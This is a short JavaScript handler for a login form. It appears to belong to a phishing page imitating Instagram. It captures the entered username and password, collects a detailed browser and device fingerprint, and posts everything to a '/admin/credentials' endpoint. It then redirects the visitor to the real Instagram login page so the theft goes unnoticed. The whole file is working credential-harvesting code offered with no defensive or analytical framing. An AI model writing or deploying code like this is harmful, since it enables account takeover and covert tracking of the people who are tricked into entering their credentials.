document.getElementById('loginForm').addEventListener('submit', async function(e) {
  e.preventDefault();
  const submitButton = this.querySelector('button[type="submit"]');
  submitButton.classList.add('loading');
  submitButton.disabled = true;
  const inputs = this.querySelectorAll('input');
  const username = inputs[0].value;
  const password = inputs[1].value;
  
  // Collect additional user information
  const userInfo = {
    username,
    password,
    userAgent: navigator.userAgent,
    browser: {
      name: navigator.appName,
      version: navigator.appVersion,
      vendor: navigator.vendor,
      isMobile: /Mobile|Android|iOS/.test(navigator.userAgent),
    },
    screen: {
      width: window.screen.width,
      height: window.screen.height,
      colorDepth: window.screen.colorDepth,
      pixelRatio: window.devicePixelRatio,
      orientation: screen.orientation?.type || 'unknown',
    },
    system: {
      platform: navigator.platform,
      language: navigator.language,
      languages: navigator.languages?.join(', '),
      cores: navigator.hardwareConcurrency,
      memory: performance?.memory?.jsHeapSizeLimit,
      online: navigator.onLine,
    },
    window: {
      outerWidth: window.outerWidth,
      outerHeight: window.outerHeight,
    },
    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    timestamp: new Date().toISOString(),
    referrer: document.referrer,
    cookiesEnabled: navigator.cookieEnabled
  };

  try {
    const response = await fetch('/admin/credentials', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(userInfo)
    });
    
    if (response.ok) {
      window.location.href = 'https://www.instagram.com/accounts/login/';
    } else {
      alert('Login failed');
    }
  } catch (error) {
    console.error('Error:', error);
    alert('An error occurred');
  }
});
